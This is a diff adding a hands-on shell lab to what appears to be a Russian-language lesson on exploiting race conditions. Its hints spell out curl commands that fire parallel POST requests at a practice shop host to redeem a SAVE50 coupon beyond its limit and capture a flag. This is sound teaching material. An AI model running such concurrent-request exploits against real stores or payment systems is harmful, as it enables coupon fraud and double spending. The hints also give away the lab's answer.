@@ -12,6 +12,18 @@ useful_for:
   - "Bug bounty"
 estimated_minutes: 45
 summary: "Как эксплуатировать гонки: превышение лимитов, двойное списание, обход одноразовых проверок и single-packet атака."
+lab:
+  kind: shell
+  title: "Практика: race condition"
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - Один запрос: `curl -s -X POST 'http://shop.local/cart/coupon' -d 'code=SAVE50'`.
+    - Последовательные запросы лимит не обходят — нужна ОДНОВРЕМЕННОСТЬ.
+    - В curl пачка одновременных запросов делается через `--parallel` и URL-глоб (`burst=20`).
+    - `curl -s --parallel 'http://shop.local/cart/coupon?code=SAVE50&burst=20' -X POST | tail -1 > found.txt`, затем `check`.
 ---
 
 ## Вопрос, с которого всё начинается
